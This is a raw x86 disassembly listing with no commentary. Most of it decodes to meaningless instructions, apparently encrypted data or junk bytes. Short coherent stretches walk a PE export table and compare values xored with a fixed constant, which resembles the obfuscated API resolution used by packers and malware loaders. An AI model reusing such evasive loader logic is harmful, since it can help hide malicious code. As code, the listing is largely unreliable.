  40b8f8:	fisub  WORD PTR [edi]
  40b8fa:	sub    DWORD PTR [ecx-0x18],edx
  40b8fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8fe:	inc    eax
  40b8ff:	in     eax,0xf6
  40b901:	(bad)  
  40b902:	dec    ebx
  40b903:	in     al,0xb5
  40b905:	mov    ebx,0xe09f055b
  40b90a:	cmp    esi,ecx
  40b90c:	xchg   DWORD PTR [edi+0x0],esi
  40b90f:	or     ah,BYTE PTR [edx]
  40b911:	mov    ds:0x8b9d2442,eax
  40b916:	cmp    bl,BYTE PTR [ebp+0x46]
  40b919:	mov    edx,esi
  40b91b:	xor    edx,DWORD PTR [edx]
  40b91d:	popa   
  40b91e:	push   edi
  40b91f:	sahf   
  40b920:	sub    al,0x55
  40b922:	mov    dh,BYTE PTR [edi+0x5d7395ff]
  40b928:	push   cs
  40b929:	push   eax
  40b92a:	xchg   ecx,eax
  40b92b:	jp     0x40b99f
  40b92d:	and    esi,ecx
  40b92f:	sar    BYTE PTR [edi],0x6c
  40b932:	fmul   DWORD PTR [edx+0x52]
  40b935:	sbb    BYTE PTR [esi],0xc5
  40b938:	fmul   QWORD PTR [ecx+0x458bd44d]
  40b93e:	in     al,dx
  40b93f:	mov    ecx,DWORD PTR [ebp+0x8]
  40b942:	add    ecx,DWORD PTR [eax+0x1c]
  40b945:	xor    esi,esi
  40b947:	mov    DWORD PTR [ebp-0x14],ecx
  40b94a:	mov    eax,DWORD PTR [ebp-0x28]
  40b94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40b950:	add    ecx,DWORD PTR [eax+edi*4]
  40b953:	jmp    0x40ba38
  40b958:	pop    ss
  40b959:	pusha  
  40b95a:	pop    esp
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	jns    0x40b916
  40b95e:	out    0x61,eax
  40b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b961:	push   ds
  40b962:	jg     0x40b96d
  40b964:	out    dx,al
  40b965:	cmp    eax,0x33790768
  40b96a:	jle    0x40b9ea
  40b96c:	mov    dh,0x7e
  40b96e:	jle    0x40b9ee
  40b970:	pop    edi
  40b971:	mov    ecx,0xc0770b4f
  40b976:	push   ss
  40b977:	sub    BYTE PTR [bp+si],0xcc
  40b97b:	pop    ss
  40b97c:	sbb    ecx,ebp
  40b97e:	mov    edx,0x424c8340
  40b983:	xor    BYTE PTR [ebp+0x21],al
  40b986:	in     eax,dx
  40b987:	test   al,0xb
  40b989:	loopne 0x40b959
  40b98b:	mov    bl,0x3c
  40b98d:	jnp    0x40b9f0
  40b98f:	dec    ebx
  40b990:	xor    BYTE PTR [ecx],0xa4
  40b993:	or     DWORD PTR [ebx-0x52],edx
  40b996:	sar    bh,0x80
  40b999:	jb     0x40b9d7
  40b99b:	dec    ebx
  40b99c:	xor    BYTE PTR ds:0xb2a43011,dh
  40b9a2:	add    al,BYTE PTR [ebp+edi*8+0x3eb7f419]
  40b9a9:	outs   dx,DWORD PTR ds:[esi]
  40b9aa:	iret   
  40b9ab:	cli    
  40b9ac:	into   
  40b9ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9ae:	fstp   TBYTE PTR [esi]
  40b9b0:	fild   WORD PTR [edi]
  40b9b2:	(bad)  
  40b9b3:	mov    ah,0x9d
  40b9b5:	aaa    
  40b9b6:	std    
  40b9b7:	and    DWORD PTR [edx-0x4c],esp
  40b9ba:	push   edi
  40b9bb:	mov    esp,0xeb60291f
  40b9c0:	jmp    0x286:0xcb5001f6
  40b9c7:	in     al,dx
  40b9c8:	hlt    
  40b9c9:	push   esi
  40b9ca:	add    al,0xc
  40b9cc:	loope  0x40b976
  40b9ce:	stos   BYTE PTR es:[edi],al
  40b9cf:	bound  edx,QWORD PTR [edx+0x5defae2a]
  40b9d5:	mov    edx,0xb17f2734
  40b9da:	stc    
  40b9db:	or     BYTE PTR [edx-0x38],dh
  40b9de:	dec    eax
  40b9df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9e0:	push   ebp
  40b9e1:	mov    ds:0xf138304e,al
  40b9e6:	cmp    eax,0x5c13833b
  40b9eb:	int    0x65
  40b9ed:	add    ah,BYTE PTR [edx]
  40b9ef:	xor    DWORD PTR [eax-0x3a8c67ed],edi
  40b9f5:	xchg   ebx,eax
  40b9f6:	pusha  
  40b9f7:	and    al,0xe5
  40b9f9:	loop   0x40b9e1
  40b9fb:	daa    
  40b9fc:	xor    BYTE PTR [ebp+0x7e],0x71
  40ba00:	sbb    edx,DWORD PTR [esi-0x44]
  40ba03:	jge    0x40b9e5
  40ba05:	sub    ecx,DWORD PTR [edx-0x56]
  40ba08:	jmp    0x40ba64
  40ba0a:	sbb    BYTE PTR [edx],cl
  40ba0c:	ror    BYTE PTR [esi-0x4f48ec98],0x39
  40ba13:	xchg   ecx,eax
  40ba14:	jbe    0x40ba3f
  40ba16:	daa    
  40ba17:	loopne 0x40b9d1
  40ba19:	lds    eax,FWORD PTR [eax+ecx*2]
  40ba1c:	ins    BYTE PTR es:[edi],dx
  40ba1d:	fadd   DWORD PTR [edx+edi*4+0x3e]
  40ba21:	hlt    
  40ba22:	mov    dl,0x9b
  40ba24:	mov    ds:0x70341cde,al
  40ba29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba2a:	ret    0x5c72
  40ba2d:	int    0x9a
  40ba2f:	lahf   
  40ba30:	or     ch,BYTE PTR [edi+edi*8+0xe]
  40ba34:	shl    BYTE PTR [edi+0x458d1907],1
  40ba3a:	clc    
  40ba3b:	mov    DWORD PTR [ebp-0x30],ecx
  40ba3e:	push   eax
  40ba3f:	push   DWORD PTR [ebp-0x30]
  40ba42:	push   DWORD PTR [ebp+0xc]
  40ba45:	call   0x408325
  40ba4a:	mov    eax,DWORD PTR [ebp-0x4]
  40ba4d:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba50:	xor    eax,0x7510859
  40ba55:	add    eax,ebx
  40ba57:	cmp    ecx,eax
  40ba59:	jne    0x40bb61
  40ba5f:	mov    eax,DWORD PTR [ebp-0x20]
  40ba62:	jmp    0x40bb47
  40ba67:	test   BYTE PTR [ebx+0x5b],al
  40ba6a:	scas   al,BYTE PTR es:[edi]
  40ba6b:	pop    ecx
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jns    0x40bae8
  40ba6f:	and    BYTE PTR [ebx+0x63],cl
  40ba72:	lock sub BYTE PTR [edi],cl
  40ba75:	xchg   ecx,eax
  40ba76:	outs   dx,DWORD PTR ds:[esi]
  40ba77:	mov    cl,0x30
  40ba79:	jle    0x40baf9
  40ba7b:	mov    dh,0x7e
  40ba7d:	jle    0x40bafd
  40ba7f:	sahf   
  40ba80:	sbb    BYTE PTR [esi+0x4954da67],bh
  40ba86:	(bad)  
  40ba88:	rcr    BYTE PTR [ecx-0x78],cl
  40ba8b:	mov    edx,0x85dc26e9
  40ba90:	adc    ch,0xdb
  40ba93:	aad    0xdd
  40ba95:	xor    al,0xa1
  40ba97:	popa   
  40ba98:	jmp    0x40ba6f
  40ba9a:	and    bl,cl
  40ba9c:	pop    eax
  40ba9d:	pop    ds
  40ba9e:	ins    BYTE PTR es:[edi],dx
  40ba9f:	jge    0x40baff
  40baa1:	mov    dh,0x1
  40baa3:	jl     0x40bb1a
  40baa5:	xchg   ebp,eax
  40baa6:	xchg   edi,eax
  40baa7:	sub    eax,0xe97cfa0e
  40baac:	xor    DWORD PTR [eax+0x70aa6483],0xffffff87
  40bab3:	sahf   
  40bab4:	mov    ds,esi
  40bab6:	jb     0x40baad
  40bab8:	xor    al,0xb2
  40baba:	push   edi
  40babb:	cld    
  40babc:	xchg   edi,eax
  40babd:	push   0x5be718a
  40bac2:	pop    es
  40bac3:	nop
  40bac4:	mov    ah,0x72
  40bac6:	add    DWORD PTR [ebx+0x7],ebx
  40bac9:	ins    BYTE PTR es:[edi],dx
  40baca:	ror    DWORD PTR [ebx-0x24],cl
  40bacd:	pop    esp
  40bace:	adc    DWORD PTR [ebx-0x440947d5],edi
  40bad4:	sub    edx,DWORD PTR [ebp-0x2b]
  40bad7:	out    dx,al
  40bad8:	mov    DWORD PTR [ecx],0x9cb4f85f
  40bade:	in     eax,dx
  40badf:	cmp    al,0x6d
  40bae1:	sbb    BYTE PTR es:[edx],ch
  40bae4:	mov    esp,0x4ec34024
  40bae9:	pop    edi
  40baea:	or     al,0xab
  40baec:	cli    
  40baed:	ret    0xe067
  40baf0:	inc    edx
  40baf1:	dec    esp
  40baf2:	dec    edi
  40baf3:	fdivr  st,st(2)
  40baf5:	loope  0x40bab0
  40baf7:	inc    esi
  40baf8:	xchg   esi,eax
  40baf9:	or     dh,bh
  40bafb:	push   edi
  40bafc:	(bad)
  40bb01:	cdq    
  40bb02:	mov    dh,0x63
  40bb04:	pop    esp
  40bb05:	shl    DWORD PTR [edi],1
  40bb07:	mov    eax,0x644c5d42
  40bb0c:	mov    bl,0xf0
  40bb0e:	adc    eax,DWORD PTR [edx]
  40bb10:	ret    
  40bb11:	outs   dx,BYTE PTR ds:[esi]
  40bb12:	add    al,0xb9
  40bb14:	arpl   bp,di
  40bb16:	adc    cl,al
  40bb18:	xor    eax,0x9e062fd9
  40bb1d:	jo     0x40bb6b
  40bb1f:	mov    ebp,0x6b762737
  40bb24:	test   al,0x56
  40bb26:	add    al,0xa3
  40bb29:	lods   eax,DWORD PTR ds:[esi]
  40bb2a:	mov    eax,ds:0x2141cbd2
  40bb2f:	push   ebp
  40bb30:	push   esp
  40bb31:	mov    bh,0x37
  40bb33:	push   ebp
  40bb34:	fs fwait
  40bb36:	jg     0x40bb3c
  40bb38:	popa   
  40bb39:	pop    ebx
  40bb3a:	push   es
  40bb3b:	fnstcw WORD PTR [edx]
  40bb3d:	enter  0x6869,0x76
  40bb41:	mov    ah,0x5
  40bb43:	add    al,0x94
  40bb45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb46:	dec    eax
  40bb47:	inc    edi
  40bb48:	cmp    edi,eax
  40bb4a:	jb     0x40b2a5
  40bb50:	jmp    0x40bb71
  40bb55:	mov    eax,DWORD PTR [ebp-0x4]
  40bb58:	xor    eax,esi
  40bb5a:	add    eax,ebx
  40bb5c:	jmp    0x40c696
  40bb61:	mov    eax,DWORD PTR [ebp-0x2c]
  40bb64:	movzx  eax,WORD PTR [eax+edi*2]
  40bb68:	mov    ecx,DWORD PTR [ebp-0x14]
  40bb6b:	mov    eax,DWORD PTR [ecx+eax*4]
  40bb6e:	mov    DWORD PTR [ebp+0xc],eax
  40bb71:	mov    eax,DWORD PTR [ebp-0x4]
  40bb74:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb77:	xor    eax,0x7510859
  40bb7c:	add    eax,ebx
  40bb7e:	cmp    ecx,eax
  40bb80:	jne    0x40bb93
  40bb86:	mov    eax,DWORD PTR [ebp-0x4]
  40bb89:	xor    eax,0x7510859
  40bb8e:	jmp    0x40bb5a
  40bb93:	mov    eax,DWORD PTR [ebp+0xc]
  40bb96:	add    eax,DWORD PTR [ebp+0x8]
  40bb99:	mov    DWORD PTR [ebp-0x10],eax
  40bb9c:	mov    eax,DWORD PTR [ebp-0x1c]
  40bb9f:	test   eax,eax
  40bba1:	je     0x40c2b4
  40bba7:	mov    DWORD PTR [ebp-0x24],esi
  40bbaa:	push   0xb
  40bbac:	pop    ecx
  40bbad:	push   0x5
  40bbaf:	dec    ecx
  40bbb0:	jmp    0x40bc95
  40bbb5:	pop    ss
  40bbb6:	imul   dh
  40bbb8:	mov    bl,0x6f
  40bbba:	jnp    0x40bb77
  40bbbc:	push   0xffffffce
  40bbbe:	pop    ecx
  40bbbf:	and    esi,ebx
  40bbc1:	ds push ecx
  40bbc3:	lods   eax,DWORD PTR ds:[esi]
  40bbc4:	aaa    
  40bbc5:	mov    DWORD PTR [ecx],esi
  40bbc7:	jle    0x40bc47
  40bbc9:	mov    dh,0x7e
  40bbcb:	jle    0x40bc4b
  40bbcd:	pop    ss
  40bbce:	sub    BYTE PTR [eax-0x334ca9f6],0x1d
  40bbd5:	mov    eax,0xcb23d06c
  40bbda:	ins    DWORD PTR es:[edi],dx
  40bbdb:	(bad)
  40bbde:	xlat   BYTE PTR ds:[ebx]
  40bbdf:	xor    edx,DWORD PTR [edi]
  40bbe1:	push   esi
  40bbe2:	xchg   ecx,eax
  40bbe3:	ror    ebx,cl
  40bbe5:	cmp    al,0xe2
  40bbe7:	cmc    
  40bbe8:	in     eax,dx
  40bbe9:	enter  0x3297,0xd1
  40bbed:	aas    
  40bbee:	(bad)  
  40bbef:	call   0xcafaabb9
  40bbf4:	mov    DWORD PTR [edx-0x9],ebx
  40bbf7:	mov    ds,WORD PTR [edx-0x64]
  40bbfa:	std    
  40bbfb:	xchg   ebp,eax
  40bbfc:	enter  0xc1e3,0xa8
  40bc00:	cmp    ah,ch
  40bc02:	xchg   esp,eax
  40bc03:	push   edx
  40bc04:	arpl   WORD PTR [ebx-0x3e434088],cx
  40bc0a:	hlt    
  40bc0b:	cs inc edi
  40bc0d:	addr16 mov edx,0x7c1637dc
  40bc13:	lock dec edx
  40bc15:	aaa    
  40bc16:	xchg   esp,eax
  40bc17:	cdq    
  40bc18:	retf   0x9fda
  40bc1b:	rol    BYTE PTR [edi-0x1a679a3f],cl
  40bc21:	cdq    
  40bc22:	(bad)  
  40bc23:	cmp    al,0x49
  40bc25:	sub    al,0xe5
  40bc27:	outs   dx,DWORD PTR ds:[esi]
  40bc28:	mov    ebx,0x3e0b8ef1
  40bc2d:	adc    edi,DWORD PTR [edi+0x26cafd4c]
  40bc33:	push   edx
  40bc34:	hlt    
  40bc35:	and    eax,DWORD PTR [edi-0x67f100f8]
  40bc3b:	xchg   ecx,eax
  40bc3c:	popf   
  40bc3d:	or     DWORD PTR [ecx],ebx
  40bc3f:	jl     0x40bcac
  40bc41:	jnp    0x40bc50
  40bc43:	rcr    edx,0x69
  40bc46:	and    DWORD PTR [eax-0x252b3208],ecx
  40bc4c:	sahf   
  40bc4d:	pop    ds
  40bc4e:	aam    0x6d
  40bc50:	push   ecx
  40bc51:	stos   BYTE PTR es:[edi],al
  40bc52:	icebp  
  40bc53:	mov    bl,ch
  40bc55:	out    dx,al
  40bc56:	into   
  40bc57:	sti    
  40bc58:	popf   
  40bc59:	sub    BYTE PTR [eax-0x5a],cl
  40bc5c:	in     eax,0xb
  40bc5e:	xlat   BYTE PTR ds:[ebx]
  40bc5f:	icebp  
  40bc60:	lahf   
  40bc61:	push   cs
  40bc62:	dec    ebp
  40bc63:	sbb    ebx,ebx
  40bc65:	add    ecx,DWORD PTR [ecx+0x2c369d94]
  40bc6b:	rcl    ecx,1
  40bc6d:	jno    0x40bc86
  40bc6f:	jp     0x40bcd5
  40bc71:	push   esp
  40bc72:	ja     0x40bc9a
  40bc74:	mov    ch,0x73
  40bc76:	sbb    bh,BYTE PTR [eax-0x3c8de119]
  40bc7c:	push   0xffffffca
  40bc7e:	mov    eax,0xa9faf2b3
  40bc83:	sub    edx,DWORD PTR [ebp+edi*4+0x45]
  40bc87:	out    0xda,eax
  40bc89:	and    al,0xd6
  40bc8b:	hlt    
  40bc8c:	outs   dx,BYTE PTR ds:[esi]
  40bc8d:	ret    0x30e
  40bc90:	jp     0x40bc92
  40bc92:	pop    edi
  40bc93:	retf   0x5b3b
  40bc96:	xchg   ebx,ecx
  40bc98:	sub    ebx,ecx
  40bc9a:	xchg   ebx,ecx
  40bc9c:	dec    ecx
  40bc9d:	mov    eax,DWORD PTR [ebp-0x1c]
  40bca0:	imul   eax,ecx
  40bca3:	sub    esp,eax
  40bca5:	mov    DWORD PTR [ebp-0x24],esp
  40bca8:	mov    eax,DWORD PTR [ebp-0x4]
  40bcab:	mov    ecx,0x7510859
  40bcb0:	jmp    0x40bd95
  40bcb5:	xchg   edi,eax
  40bcb6:	adc    DWORD PTR [ecx+eax*2+0x78],0x79
  40bcbb:	mov    ebx,0xdff72d79
  40bcc0:	ins    DWORD PTR es:[edi],dx
  40bcc1:	iret   
  40bcc2:	cmp    ebx,DWORD PTR ds:0x7e36c1e4
  40bcc8:	jle    0x40bc80
  40bcca:	jle    0x40bd4a
  40bccc:	jle    0x40bcc5
  40bcce:	ins    BYTE PTR es:[edi],dx
  40bccf:	leave  
  40bcd0:	sub    al,al
  40bcd2:	cmp    al,0xb6
  40bcd4:	les    ebx,FWORD PTR [ebx]
  40bcd6:	(bad)  
  40bcd7:	loopne 0x40bcd7
  40bcd9:	and    DWORD PTR [ebx-0xe],esi
  40bcdc:	pop    es
  40bcdd:	les    esi,FWORD PTR [edx-0x4]
  40bce0:	shr    ebx,1
  40bce2:	in     al,0xb4
  40bce4:	lahf   
  40bce5:	sub    al,0xf
  40bce7:	ins    BYTE PTR es:[edi],dx
  40bce8:	mov    bh,0x7a
  40bcea:	fwait
  40bceb:	out    dx,al
  40bcec:	mov    edi,0xb713cb8b
  40bcf1:	xchg   ecx,eax
  40bcf2:	cmp    BYTE PTR [eax-0x18430422],ah
  40bcf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf9:	dec    BYTE PTR [esi-0x3024670]
  40bcff:	push   0xfffffff1
  40bd01:	push   ds
  40bd02:	inc    BYTE PTR [ebp+0x3d03203b]
  40bd08:	adc    esi,DWORD PTR [edx+0x43]
  40bd0b:	fucomi st,st(7)
  40bd0d:	jp     0x40bd7f
  40bd0f:	(bad)  cs:[esi]
  40bd12:	dec    esi
  40bd13:	and    BYTE PTR [esi-0x51],dl
  40bd16:	xchg   edx,eax
  40bd17:	fcmovb st,st(0)
  40bd19:	fist   WORD PTR [ebx+0xe]
  40bd1c:	cmp    al,0x28
  40bd1e:	je     0x40bcc7
  40bd20:	fadd   DWORD PTR [esp-0x10]
  40bd24:	aaa    
  40bd25:	ss int3 
  40bd27:	xor    al,0x4d
  40bd29:	inc    ebp
  40bd2a:	and    DWORD PTR [ecx+0x58f544c],edi
  40bd30:	jns    0x40bcda
  40bd32:	and    BYTE PTR [ebx+ebp*1-0x2afc5cc],bh
  40bd39:	rcr    DWORD PTR [ebx+0x4a],0x59
  40bd3d:	lods   eax,DWORD PTR ds:[esi]
  40bd3e:	call   0xdf2533f
  40bd43:	popf   
  40bd44:	imul   esi,DWORD PTR [ecx+0x20c3fd33],0xb1746b81
  40bd4e:	sbb    dh,bl
  40bd50:	imul   eax,DWORD PTR [ebp-0x2a64412],0x1fe246ba
  40bd5a:	dec    ebx
  40bd5b:	pushf  
  40bd5c:	mov    ebp,0x4b3c963
  40bd61:	or     ebx,DWORD PTR [eax+edi*4+0x786e4376]
  40bd68:	jno    0x40bcee
  40bd6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd6b:	sti    
  40bd6c:	sbb    esi,DWORD PTR [ebx+0x1d]
  40bd6f:	push   es
  40bd70:	mov    es,WORD PTR [esi]
  40bd72:	push   esi
  40bd73:	in     al,0x98
  40bd75:	sar    BYTE PTR [ebp-0x6d],1
  40bd78:	mov    edi,DWORD PTR [eax-0x41]
  40bd7b:	jl     0x40bd0f
  40bd7d:	stos   DWORD PTR es:[edi],eax
  40bd7e:	lods   eax,DWORD PTR ds:[esi]
  40bd7f:	sti    
  40bd80:	mov    al,0x59
  40bd82:	sbb    al,0x9a
  40bd84:	or     al,0x5
  40bd86:	jle    0x40bd42
  40bd88:	mov    ?,WORD PTR [ebx]
  40bd8a:	xchg   edi,eax
  40bd8b:	and    BYTE PTR [ebx+0x5c],0x4e
  40bd8f:	push   esp
  40bd90:	add    al,0xfd
  40bd92:	push   esi
  40bd93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd94:	mov    ds:0x9fbac133,al
  40bd99:	jb     0x40bdcd
  40bd9b:	add    BYTE PTR [ebx],al
  40bd9d:	ret    0x4589
  40bda0:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  40bda6:	add    eax,edx
  40bda8:	mov    edx,DWORD PTR [ebp+0x14]
  40bdab:	jmp    0x40be90
  40bdb0:	dec    DWORD PTR [ebx-0x47d6c7ef]
  40bdb6:	xchg   DWORD PTR [ecx-0x43979b07],edi
  40bdbc:	mov    edx,DWORD PTR [ebx-0x53]
  40bdbf:	fstp   QWORD PTR [ecx]
  40bdc1:	aaa    
  40bdc2:	jle    0x40be42
  40bdc4:	mov    dh,0x7e
  40bdc6:	jle    0x40be46
  40bdc8:	sbb    eax,DWORD PTR [eax]
  40bdca:	rcl    DWORD PTR [ecx+0x4d00cc8e],cl
  40bdd0:	mov    ds:0x199bff4d,al
  40bdd5:	mov    esp,0xb7bfbedb
  40bdda:	test   eax,0x9c9d9178
  40bddf:	sbb    eax,DWORD PTR [ebx+0x3649a622]
  40bde5:	add    eax,0x13d3111b
  40bdea:	and    eax,DWORD PTR [esi+0x5e2c0ac]
  40bdf0:	pop    edi
  40bdf1:	adc    esp,eax
  40bdf3:	xchg   ebp,eax
  40bdf4:	mov    esi,0x669964cf
  40bdf9:	mov    ah,0x2
  40bdfb:	inc    esp
  40bdfc:	cld    
  40bdfd:	fild   DWORD PTR [eax]
  40bdff:	lods   eax,DWORD PTR ds:[esi]
  40be00:	adc    DWORD PTR [edi+0x6e],0xd30f9eb2
  40be07:	mov    cx,0x7dc6
  40be0b:	jecxz  0x40be23
  40be0d:	add    bh,BYTE PTR ds:0x1ced0d4
  40be13:	dec    ebp
  40be14:	mov    WORD PTR [ecx+ebx*2-0x4d],ds
  40be18:	or     eax,0x5040e9ec
  40be1d:	adc    eax,0xe425e675
  40be22:	mov    bh,0x71
  40be24:	js     0x40be8a
  40be26:	pop    esp
  40be27:	ds mov ah,0x92
  40be2a:	pop    ebp
  40be2b:	stos   DWORD PTR es:[edi],eax
  40be2c:	rcl    DWORD PTR [esi],0xb
  40be2f:	mov    edi,0x52d653da
  40be34:	sbb    al,0xe0
  40be36:	enter  0xa788,0x90
  40be3a:	inc    edx
  40be3b:	aaa    
  40be3c:	jmp    0xbba5:0x5db7a070
  40be43:	mov    ecx,0x4262806c
  40be48:	ja     0x40beb7
  40be4a:	(bad)  
  40be4b:	jle    0x40be88
  40be4d:	push   ds
  40be4e:	jp     0x40be6e
  40be50:	sbb    ebp,esp
  40be52:	enter  0xb166,0x1
  40be56:	add    al,0x68
  40be58:	mov    dl,0xe
  40be5a:	rol    DWORD PTR [ebx],0x88
  40be5d:	or     ah,BYTE PTR [ebx+0x108b5913]
  40be63:	mov    ecx,0x8b020234
  40be68:	push   ss
  40be69:	in     al,dx
  40be6a:	ss rcl edi,0xd2
  40be6e:	loop   0x40be07
  40be70:	pop    ebp
  40be71:	and    ecx,eax
  40be73:	ja     0x40be5a
  40be75:	mov    DWORD PTR [ecx],ebp
  40be77:	pop    eax
  40be78:	in     al,0x88
  40be7a:	mov    al,0xf0
  40be7c:	test   eax,0x98c4a213
  40be81:	xor    DWORD PTR [edi+0x34],eax
  40be84:	iret   
  40be85:	pop    ecx
  40be86:	lock adc al,0xa3
  40be89:	sbb    al,0x53
  40be8b:	(bad)  
  40be8c:	movsx  esp,si
  40be8f:	sub    ecx,DWORD PTR [edi]
  40be91:	scas   eax,DWORD PTR es:[edi]
  40be92:	add    ch,cl
  40be94:	loopne 0x40be96
  40be96:	add    BYTE PTR [eax],al
  40be98:	inc    ebp
  40be99:	loop   0x40be83
  40be9b:	xchg   edi,eax
  40be9c:	imul   esp,DWORD PTR [ebp-0x36f31fa7],0x3dd7640
  40bea6:	sub    eax,DWORD PTR [ebx+0x51]
  40bea9:	aaa    
  40beaa:	jle    0x40bf2a
  40beac:	mov    dh,0x7e
  40beae:	jle    0x40bf2e
  40beb0:	mov    ecx,0x75e39e71
  40beb5:	scas   al,BYTE PTR es:[edi]
  40beb6:	inc    esp
  40beb7:	xor    al,0x41
  40beb9:	out    dx,eax
  40beba:	pop    es
  40bebb:	or     esp,DWORD PTR [ecx]
  40bebd:	(bad)  
  40bebe:	aaa    
  40bebf:	js     0x40bee8
  40bec1:	mov    edx,0x2b89e072
  40bec6:	mov    ds:0xe8065304,al
  40becb:	dec    eax
  40becc:	mov    esi,0x94f5117e
  40bed1:	lds    eax,FWORD PTR cs:[ebx+0x3e]
  40bed5:	dec    ebx
  40bed6:	sti    
  40bed7:	dec    esi
  40bed8:	push   0xdbd974e4
  40bedd:	push   es
  40bede:	cmp    DWORD PTR [eax],esp
  40bee0:	sahf   
  40bee1:	fs icebp 
  40bee3:	pop    edx
  40bee4:	push   cs
  40bee5:	ins    DWORD PTR es:[edi],dx
  40bee6:	daa    
  40bee7:	(bad)  
  40bee8:	sbb    BYTE PTR [ebp-0x32],bh
  40beeb:	and    eax,0x16bff89e
  40bef0:	(bad)  
  40bef1:	mov    cl,0x9a
  40bef3:	mov    dh,0x2b
  40bef5:	mov    bh,0x7c
  40bef7:	sub    al,0x6e
  40bef9:	jecxz  0x40bf32
  40befb:	jb     0x40bf49
  40befd:	pop    eax
  40befe:	std    
  40beff:	mov    dl,0x43
  40bf01:	shl    DWORD PTR [ecx-0x17],cl
  40bf04:	mov    ebp,0x5802b6a6
  40bf09:	fidivr DWORD PTR [eax-0x55]
  40bf0c:	cld    
  40bf0d:	dec    ecx
  40bf0e:	out    0xf6,eax
  40bf10:	mov    ebx,0xa897215c
  40bf15:	xchg   BYTE PTR [ebx+esi*2-0x56aed304],ch
  40bf1c:	fidiv  DWORD PTR [esp+ecx*8+0x2f3bf938]
  40bf23:	inc    ecx
  40bf24:	push   ecx
  40bf25:	hlt    
  40bf26:	test   ah,ah
  40bf28:	inc    esp
  40bf29:	inc    esp
  40bf2a:	mov    eax,0xaa091a34
  40bf2f:	fsub   st,st(0)
  40bf31:	jl     0x40bf41
  40bf33:	sar    edx,cl
  40bf35:	mov    ds:0x4a7b4d3b,al
  40bf3a:	into   
  40bf3b:	push   ebp
  40bf3c:	jg     0x40bfa7
  40bf3e:	iret   
  40bf3f:	les    eax,FWORD PTR [edx]
  40bf41:	and    DWORD PTR [ebp-0x2d],ebp
  40bf44:	xor    eax,0xc6c9bfc7
  40bf49:	in     al,0x22
  40bf4b:	adc    BYTE PTR [eax],dl
  40bf4d:	imul   esi,DWORD PTR [eax-0x11d482d7],0xa9b35471
  40bf57:	cmp    DWORD PTR ds:0x3a6ead5f,edi
  40bf5d:	or     BYTE PTR [esi],cl
  40bf5f:	outs   dx,DWORD PTR ds:[esi]
  40bf60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf61:	idiv   esi
  40bf63:	xor    dl,BYTE PTR [ecx+eax*2+0x7b]
  40bf67:	cmovl  eax,DWORD PTR [edx]
  40bf6a:	das    
  40bf6b:	xchg   edx,eax
  40bf6c:	xor    ebp,DWORD PTR ds:0x66e8ca9e
  40bf72:	popa   
  40bf73:	xchg   edi,eax
  40bf74:	in     al,0x93
  40bf76:	adc    bh,BYTE PTR [ecx-0x75]
  40bf79:	push   ebp
  40bf7a:	cld    
  40bf7b:	xor    edx,ecx
  40bf7d:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf80:	lea    ecx,[edx+ecx*1+0x32729f]
  40bf87:	cmp    ecx,eax
  40bf89:	je     0x40c1ca
  40bf8f:	mov    edi,DWORD PTR [ebp-0x18]
  40bf92:	mov    eax,DWORD PTR [ebp+0x8]
  40bf95:	mov    edx,DWORD PTR [ebp+0x14]
  40bf98:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40bf9c:	jmp    0x40c081
  40bfa1:	pop    ss
  40bfa2:	sub    al,0x93
  40bfa4:	sub    edi,DWORD PTR [ecx+0x192097b9]
  40bfaa:	jne    0x40bf81
  40bfac:	stos   BYTE PTR es:[edi],al
  40bfad:	out    0xc,al
  40bfaf:	cmp    cl,BYTE PTR [ecx+ebp*4+0x34]
  40bfb3:	jle    0x40c033
  40bfb5:	mov    dh,0x7e
  40bfb7:	jle    0x40c037
  40bfb9:	sbb    eax,DWORD PTR [esi-0x1dff8f3c]
  40bfbf:	enter  0xf7f5,0x81
  40bfc3:	dec    eax
  40bfc4:	mov    ds,WORD PTR [esi+0x5f]
  40bfc7:	aaa    
  40bfc8:	jbe    0x40bfd7
  40bfca:	pop    eax
  40bfcb:	jno    0x40bf7c
  40bfcd:	sub    DWORD PTR [ebx],eax
  40bfcf:	mov    eax,ds:0xedb776ba
  40bfd4:	pushf  
  40bfd5:	xchg   ebx,eax
  40bfd6:	pop    edx
  40bfd7:	push   esp
  40bfd8:	sbb    al,0xd7
  40bfda:	jo     0x40bfd5
  40bfdc:	xchg   esi,ebx
  40bfde:	repz inc ecx
  40bfe0:	fadd   QWORD PTR ds:0x2fd90da7
  40bfe6:	(bad)  
  40bfe7:	stc    
  40bfe8:	mov    ds:0x72353a57,al
  40bfed:	sub    bl,bh
  40bfef:	cmp    BYTE PTR [ebp-0x66a33963],bl
  40bff5:	imul   esi,ebx,0xeb1628bb
  40bffb:	mov    bl,0x25
  40bffd:	out    dx,eax
  40bffe:	mov    esi,DWORD PTR [edi]
  40c000:	jle    0x40bfb4
  40c002:	ja     0x40bf97
  40c004:	loopne 0x40bf9e
  40c006:	cmp    DWORD PTR [esi-0x6b],eax
  40c009:	sbb    DWORD PTR [edx],esi
  40c00b:	jmp    DWORD PTR [edx-0x15ba8472]
  40c011:	aas    
  40c012:	and    DWORD PTR [ebp-0x7b209313],eax
  40c018:	sbb    eax,0xa13deca4
  40c01d:	aam    0xc4
  40c01f:	imul   ebx,DWORD PTR [ebp+edi*4-0x24],0x4e485eb4
  40c027:	sbb    al,0xf0
  40c029:	inc    ebp
  40c02a:	stc    
  40c02b:	(bad)  
  40c02c:	cmp    al,0x0
  40c02e:	aad    0xf9
